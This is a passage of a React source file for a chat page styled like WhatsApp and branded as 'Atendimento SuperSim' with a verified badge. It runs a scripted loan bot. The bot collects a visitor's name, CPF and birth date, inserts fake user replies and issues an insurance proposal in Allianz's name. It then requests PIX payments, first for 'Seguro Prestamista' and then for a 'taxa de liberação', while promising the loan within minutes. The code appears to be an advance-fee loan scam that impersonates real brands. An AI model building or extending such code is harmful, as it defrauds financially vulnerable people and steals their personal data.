      setMessages((prev) => [...prev, { id: Date.now(), text: "Confirmar seguro!", fromUser: true, time: getNow(), read: true }]);
    }, 300);
    setTimeout(() => {
      setInsuranceShown(true);
      setInsuranceAccepted(true);
      addBotMessages(() => [
        { id: Date.now() + 1, insuranceCard: true, fromUser: false, time: getNow(), read: true },
      ]).then(async () => {
        const codigo = generateCode();
        const pdfUrl = await generateInsurancePdf({
          nome: nome || "N/A",
          cpf: cpf || "000.000.000-00",
          dataNascimento: dataNascimento || "00/00/0000",
          codigo,
          valor: loanDetails?.valor || 2500,
          parcelas: loanDetails?.parcelas || 12,
          valorParcela: loanDetails?.valorParcela || 250,
        });
        addBotMessages(() => [
          { id: Date.now() + 2, text: `Sua proposta de adesão ao seguro foi gerada automaticamente. Código: ${codigo}`, fromUser: false, time: getNow(), read: true },
          { id: Date.now() + 3, insurancePdf: pdfUrl, fromUser: false, time: getNow(), read: true },
        ]).then(() => {
          addBotMessages(() => [{
            id: Date.now() + 4, pdfConfirmButton: true, fromUser: false, time: getNow(), read: true,
          }]);
        });
      });
    }, 500);
  };

  const generatePixPayment = async () => {
    await addBotMessages(() => [{
      id: Date.now(), text: `Segue o PIX para pagamento do Seguro Prestamista:`,
      fromUser: false, time: getNow(), read: true,
    }]);

    try {
      const { data, error } = await supabase.functions.invoke('create-pix', {
        body: { value: 3490 },
      });

      if (error) throw error;

      // Store transaction ID for payment verification
      if (data.id) {
        setPixTransactionId(data.id);
      }

      await addBotMessages(() => [{
        id: Date.now() + 1,
        pixPayment: {
          qrCode: data.qr_code,
          qrCodeBase64: data.qr_code_base64,
          value: data.value,
        },
        fromUser: false, time: getNow(), read: true,
      }]);

      // Show "Já paguei" button
      await addBotMessages(() => [{
        id: Date.now() + 2,
        pixPaidButton: true,
        fromUser: false, time: getNow(), read: true,
      }]);

    } catch (err) {
      console.error('Erro ao gerar PIX:', err);
      await addBotMessages(() => [{
        id: Date.now() + 1,
        text: "Houve um erro ao gerar o código PIX. Tente novamente em alguns instantes ou entre em contato com o suporte.",
        fromUser: false, time: getNow(), read: true,
      }]);
    }
  };

  const handlePixEdit = (newVal: string) => {
    setPixValue(newVal);
  };

  const handleInsuranceAccept = async () => {
    setInsuranceAccepted(true);
    setTimeout(() => {
      setMessages((prev) => [...prev, { id: Date.now(), text: "Quero aderir ao seguro!", fromUser: true, time: getNow(), read: true }]);
    }, 300);
    setTimeout(() => {
      addBotMessages(() => [{
        id: Date.now() + 1,
        text: `Excelente escolha, ${firstName || "cliente"}! Estamos gerando sua proposta de adesão ao Seguro Prestamista...`,
        fromUser: false, time: getNow(), read: true,
      }]);
    }, 500);

    // Generate PDF
    const codigo = generateCode();
    const pdfUrl = await generateInsurancePdf({
      nome: nome || "N/A",
      cpf: cpf || "000.000.000-00",
      dataNascimento: dataNascimento || "00/00/0000",
      codigo,
      valor: loanDetails?.valor || 2500,
      parcelas: loanDetails?.parcelas || 12,
      valorParcela: loanDetails?.valorParcela || 250,
    });

    setTimeout(() => {
      addBotMessages(() => [
        { id: Date.now() + 2, text: `Pronto! Sua proposta de adesão foi gerada com sucesso. Código: ${codigo}`, fromUser: false, time: getNow(), read: true },
        { id: Date.now() + 3, insurancePdf: pdfUrl, fromUser: false, time: getNow(), read: true },
      ]);
    }, 4000);
  };

  const handleInsuranceDecline = () => {
    setInsuranceAccepted(false);
    setTimeout(() => {
      setMessages((prev) => [...prev, { id: Date.now(), text: "Não quero o seguro, obrigado.", fromUser: true, time: getNow(), read: true }]);
    }, 300);
    setTimeout(() => {
      addBotMessages(() => [{
        id: Date.now() + 1,
        text: `Tudo bem, ${firstName || "cliente"}! Seu empréstimo segue normalmente sem o seguro. Qualquer dúvida estamos à disposição.`,
        fromUser: false, time: getNow(), read: true,
      }]);
    }, 500);
  };

  const handleSend = () => {
    if (!input.trim()) return;
    const newMsg: ChatMessage = { id: Date.now(), text: input.trim(), fromUser: true, time: getNow(), read: false };
    setMessages((prev) => [...prev, newMsg]);
    setInput("");

    setTimeout(() => {
      setMessages((prev) => prev.map((m) => (m.id === newMsg.id ? { ...m, read: true } : m)));
    }, 1500);

    setTimeout(() => {
      addBotMessages(() => [{
        id: Date.now() + 1, text: `Obrigado pela mensagem, ${firstName || "cliente"}! Um consultor responderá em instantes.`,
        fromUser: false, time: getNow(), read: true,
      }]);
    }, 500);
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#ECE5DD]">
      <header className="bg-primary sticky top-0 z-50 px-4 py-3 flex items-center gap-3 shadow-md">
        <button onClick={() => navigate(-1)} className="text-primary-foreground hover:opacity-80 transition-opacity">
          <ArrowLeft className="w-5 h-5" />
        </button>
        <div className="w-10 h-10 rounded-full bg-white flex items-center justify-center overflow-hidden shadow-sm">
          <img src={profileImg} alt="Logo" className="w-8 h-8 object-contain" />
        </div>
        <div className="flex-1 min-w-0">
          <p className="text-primary-foreground font-bold text-base truncate flex items-center gap-0.5">Atendimento SuperSim <img src={verifiedBadge} alt="Verificado" className="w-7 h-7 shrink-0 object-contain" /></p>
          <p className="text-primary-foreground/70 text-xs">online</p>
        </div>
      </header>

      <main className="flex-1 overflow-y-auto px-3 py-4 space-y-2">
        {messages.map((msg) => (
          <div key={msg.id} className={`flex ${msg.fromUser ? "justify-end" : "justify-start"}`}>
            <div className={`max-w-[85%] rounded-2xl px-4 py-2.5 shadow-sm relative ${
              msg.fromUser ? "bg-[#DCF8C6] text-foreground rounded-tr-sm" : "bg-white text-foreground rounded-tl-sm"
            }`}>
              {msg.text && <p className="text-sm leading-relaxed whitespace-pre-wrap">{msg.text}</p>}
              {msg.audioSrc && <AudioPlayer src={msg.audioSrc} />}
              {msg.loanCard && <LoanConfirmCard details={msg.loanCard} onConfirm={handleLoanConfirm} confirmed={loanConfirmed} />}
              {msg.pixSelector && pixStep === "selecting" && <PixSelectorCard onSelect={handlePixSelect} />}
              {msg.pixSelector && pixStep !== "selecting" && (
                <div className="text-center text-xs text-muted-foreground py-1">Tipo de chave selecionado ✅</div>
              )}
              {msg.pixConfirm && (
                <PixConfirmCard type={msg.pixConfirm.type} value={pixValue} onConfirm={handlePixConfirm} onEdit={handlePixEdit} confirmed={pixConfirmed} />
              )}
              {msg.insuranceAudioConfirm && !insuranceAudioConfirmed && (
                <div className="space-y-2">
                  <p className="text-sm text-foreground">Ouça o áudio acima e confirme para prosseguir:</p>
                  <button
                    onClick={handleInsuranceAudioConfirm}
                    className="btn-3d w-full !py-2.5 !rounded-xl !text-sm !px-4"
                  >
                    ✅ Confirmar
                  </button>
                </div>
              )}
              {msg.insuranceAudioConfirm && insuranceAudioConfirmed && (
                <div className="text-center text-xs text-green-600 font-semibold py-1">✅ Confirmado!</div>
              )}
              {msg.insuranceCard && (
                <InsuranceCard onAccept={handleInsuranceAccept} onDecline={handleInsuranceDecline} accepted={insuranceAccepted} />
              )}
              {msg.insurancePdf && <InsurancePdfCard pdfUrl={msg.insurancePdf} />}
              {msg.insuranceInfoPdf && <InsuranceInfoPdfCard />}
              {msg.manualConfirmButton && !manualConfirmed && (
                <div className="space-y-2">
                  <p className="text-sm text-foreground">Leia o manual acima e confirme para prosseguir:</p>
                  <button
                    onClick={() => {
                      setManualConfirmed(true);
                      setTimeout(() => {
                        setMessages((prev) => [...prev, { id: Date.now(), text: "Li e confirmo o manual do seguro!", fromUser: true, time: getNow(), read: true }]);
                      }, 300);
                      setTimeout(() => {
                        addBotMessages(() => [{
                          id: Date.now() + 1,
                          audioSrc: "/audio/audio_pra_finalizar.mp3",
                          fromUser: false, time: getNow(), read: true,
                        }]).then(() => {
                          addBotMessages(() => [{
                            id: Date.now() + 2,
                            text: `Perfeito, ${firstName || "cliente"}! Agora falta apenas a taxa de liberação para que o valor de ${formatCurrency(loanDetails?.valor || 2500)} seja transferido para sua conta.\n\nO pagamento da taxa garante a liberação imediata do crédito via PIX.`,
                            fromUser: false, time: getNow(), read: true,
                          }]).then(() => {
                            addBotMessages(() => [{
                              id: Date.now() + 3,
                              taxaButton: true,
                              fromUser: false, time: getNow(), read: true,
                            }]);
                          });
                        });
                      }, 500);
                    }}
                    className="btn-3d w-full !py-2.5 !rounded-xl !text-sm !px-4"
                  >
                    ✅ Confirmar e prosseguir
                  </button>
                </div>
              )}
              {msg.manualConfirmButton && manualConfirmed && (
                <div className="text-center text-xs text-green-600 font-semibold py-1">✅ Confirmado!</div>
              )}
              {msg.proceedButton && !proceeded && (
                <div className="space-y-2">
                  <p className="text-sm text-foreground">Ouça o áudio acima e quando estiver pronto, clique para continuar:</p>
                  <button
                    onClick={handleProceed}
                    className="btn-3d w-full !py-2.5 !rounded-xl !text-sm !px-4"
                  >
                    ▶️ Prosseguir
                  </button>
                </div>
              )}
              {msg.proceedButton && proceeded && (
                <div className="text-center text-xs text-green-600 font-semibold py-1">✅ Prosseguindo...</div>
              )}
              {msg.pixPayment && <PixPaymentCard qrCode={msg.pixPayment.qrCode} qrCodeBase64={msg.pixPayment.qrCodeBase64} value={msg.pixPayment.value} />}
              {msg.pixPaidButton && !pixPaid && (
                <div className="space-y-2">
                  <p className="text-sm text-foreground">Após realizar o pagamento, clique no botão abaixo:</p>
                  <button
                    onClick={async () => {
                      if (checkingPayment) return;
                      setCheckingPayment(true);

                      try {
                        if (!pixTransactionId) {
                          toast.error("Erro: ID da transação não encontrado.");
                          setCheckingPayment(false);
                          return;
                        }

                        const { data, error } = await supabase.functions.invoke('check-pix', {
                          body: { transactionId: pixTransactionId },
                        });

                        if (error) throw error;

                        const status = data?.status;
                        if (status === 'paid' || status === 'completed' || status === 'confirmed' || status === 'approved') {
                          if (paymentPhase === "taxa") {
                            // Taxa paid — navigate to success page
                            setTaxaPaid(true);
                            setPixPaid(true);
                            setTimeout(() => {
                              setMessages((prev) => [...prev, { id: Date.now(), text: "Já paguei", fromUser: true, time: getNow(), read: true }]);
                            }, 300);
                            setTimeout(() => {
                              addBotMessages(() => [{
                                id: Date.now() + 10,
                                text: `Taxa de liberação confirmada com sucesso! ✅\n\nSeu crédito de ${formatCurrency(loanDetails?.valor || 2500)} está sendo processado. Você receberá um e-mail com todos os detalhes.\n\nRedirecionando...`,
                                fromUser: false, time: getNow(), read: true,
                              }]).then(() => {
                                setTimeout(() => {
                                  navigate("/sucesso", {
                                    state: {
                                      nome,
                                      valor: loanDetails?.valor || 2500,
                                      parcelas: loanDetails?.parcelas,
                                      valorParcela: loanDetails?.valorParcela,
                                    },
                                  });
                                }, 2000);
                              });
                            }, 500);
                          } else {
                            // Insurance paid — continue to manual
                            setPixPaid(true);
                            setTimeout(() => {
                              setMessages((prev) => [...prev, { id: Date.now(), text: "Já paguei", fromUser: true, time: getNow(), read: true }]);
                            }, 300);
                            setTimeout(() => {
                              addBotMessages(() => [{
                                id: Date.now() + 10,
                                text: `Pagamento do Seguro Prestamista confirmado com sucesso! ✅`,
                                fromUser: false, time: getNow(), read: true,
                              }]).then(() => {
                                addBotMessages(() => [{
                                  id: Date.now() + 11,
                                  text: `Segue o manual completo do seu Seguro Prestamista. Nele você encontra todas as informações sobre coberturas, como acionar e utilizar:`,
                                  fromUser: false, time: getNow(), read: true,
                                }]).then(() => {
                                  addBotMessages(() => [{
                                    id: Date.now() + 12,
                                    insuranceInfoPdf: true,
                                    fromUser: false, time: getNow(), read: true,
                                  }]).then(() => {
                                    addBotMessages(() => [{
                                      id: Date.now() + 13,
                                      manualConfirmButton: true,
                                      fromUser: false, time: getNow(), read: true,
                                    }]);
                                  });
                                });
                              });
                            }, 500);
                          }
                        } else {
                          toast.error("Pagamento ainda não confirmado. Aguarde a confirmação ou tente novamente.");
                        }
                      } catch (err) {
                        console.error('Erro ao verificar pagamento:', err);
                        toast.error("Erro ao verificar pagamento. Tente novamente.");
                      } finally {
                        setCheckingPayment(false);
                      }
                    }}
                    disabled={checkingPayment}
                    className="btn-3d w-full !py-2.5 !rounded-xl !text-sm !px-4 disabled:opacity-50"
                  >
                    {checkingPayment ? "⏳ Verificando pagamento..." : "✅ Já paguei"}
                  </button>
                </div>
              )}
              {msg.pixPaidButton && pixPaid && (
                <div className="text-center text-xs text-green-600 font-semibold py-1">Confirmado</div>
              )}
              {msg.pdfConfirmButton && !pdfConfirmed && (
                <div className="space-y-2">
                  <p className="text-sm text-foreground">Confira o documento acima e confirme para prosseguir com o pagamento:</p>
                  <button
                    onClick={() => {
                      setPdfConfirmed(true);
                      setTimeout(() => {
                        setMessages((prev) => [...prev, { id: Date.now(), text: "Documento conferido e confirmado!", fromUser: true, time: getNow(), read: true }]);
                      }, 300);
                      setTimeout(() => {
                        addBotMessages(() => [{
                          id: Date.now() + 2,
                          text: `Perfeito, ${firstName || "cliente"}! Para ativar o Seguro Prestamista Allianz, realize o pagamento da primeira mensalidade no valor de R$ 34,90.\n\nApós a confirmação do pagamento, sua cobertura será ativada imediatamente.\n\nO valor do empréstimo será depositado em até 5 minutos na conta informada.`,
                          fromUser: false, time: getNow(), read: true,
                        }]).then(() => {
                          generatePixPayment();
                        });
                      }, 500);
                    }}
                    className="btn-3d w-full !py-2.5 !rounded-xl !text-sm !px-4"
                  >
                    ✅ Confirmar e prosseguir
                  </button>
                </div>
              )}
              {msg.pdfConfirmButton && pdfConfirmed && (
                <div className="text-center text-xs text-green-600 font-semibold py-1">✅ Documento confirmado!</div>
              )}
              {msg.taxaButton && !taxaConfirmed && (
                <div className="space-y-2">
                  <p className="text-sm text-foreground">Clique abaixo para prosseguir com o pagamento da taxa:</p>
                  <button
                    onClick={() => {
                      setTaxaConfirmed(true);
                      setTimeout(() => {
                        setMessages((prev) => [...prev, { id: Date.now(), text: "Prosseguir com a taxa de liberação!", fromUser: true, time: getNow(), read: true }]);
                      }, 300);
                      setTimeout(() => {
                        addBotMessages(() => [{
                          id: Date.now() + 2,
                          text: `Perfeito, ${firstName || "cliente"}! Para ativar o Seguro Prestamista Allianz, realize o pagamento da primeira mensalidade no valor de R$ 34,90.\n\nApós a confirmação do pagamento, sua cobertura será ativada imediatamente.\n\nO valor do empréstimo será depositado em até 5 minutos na conta informada.`,
                          fromUser: false, time: getNow(), read: true,
                        }]).then(() => {
                          generatePixPayment();
                        });
                      }, 500);
                    }}
                    className="btn-3d w-full !py-2.5 !rounded-xl !text-sm !px-4"
                  >
                    💰 Pagar taxa de liberação
                  </button>
                </div>
              )}
              {msg.taxaButton && taxaConfirmed && (
                <div className="text-center text-xs text-green-600 font-semibold py-1">✅ Prosseguindo...</div>
              )}
              <div className="flex items-center justify-end gap-1 mt-1">
                <span className="text-[10px] text-muted-foreground">{msg.time}</span>
                {msg.fromUser && (
                  msg.read ? <CheckCheck className="w-3.5 h-3.5 text-blue-500" /> : <Check className="w-3.5 h-3.5 text-muted-foreground" />
                )}
              </div>
            </div>
          </div>
        ))}
        {isTyping && <TypingIndicator />}
        <div ref={bottomRef} />
      </main>

      {/* Show greeting suggestion button if not sent yet */}
      {!greetingSent && (
        <div className="px-3 pb-2">
          <button
            onClick={handleSendGreeting}
            className="w-full py-3 rounded-2xl bg-[#DCF8C6] text-foreground font-medium text-sm shadow-sm hover:bg-[#d0f0b8] transition-colors border border-green-200 text-left px-4"
          >
            <span className="text-muted-foreground text-xs block mb-0.5">Toque para enviar 👇</span>
            {initialMessage || "Olá, gostaria de solicitar meu empréstimo!"}
          </button>
        </div>
      )}

      <div className="sticky bottom-0 bg-[#F0F0F0] border-t border-border/30 px-3 py-2 flex items-center gap-2">
        <input type="text" value={input} onChange={(e) => setInput(e.target.value)}
          onKeyDown={(e) => e.key === "Enter" && handleSend()}
          placeholder="Digite uma mensagem..."
          className="flex-1 rounded-full bg-white px-4 py-2.5 text-sm text-foreground border-none outline-none shadow-sm placeholder:text-muted-foreground" />
        <button onClick={handleSend} className="w-10 h-10 rounded-full bg-primary flex items-center justify-center text-primary-foreground shadow-md hover:opacity-90 transition-opacity shrink-0">
          <Send className="w-4 h-4" />
        </button>
      </div>
    </div>
  );
};

export default Chat;
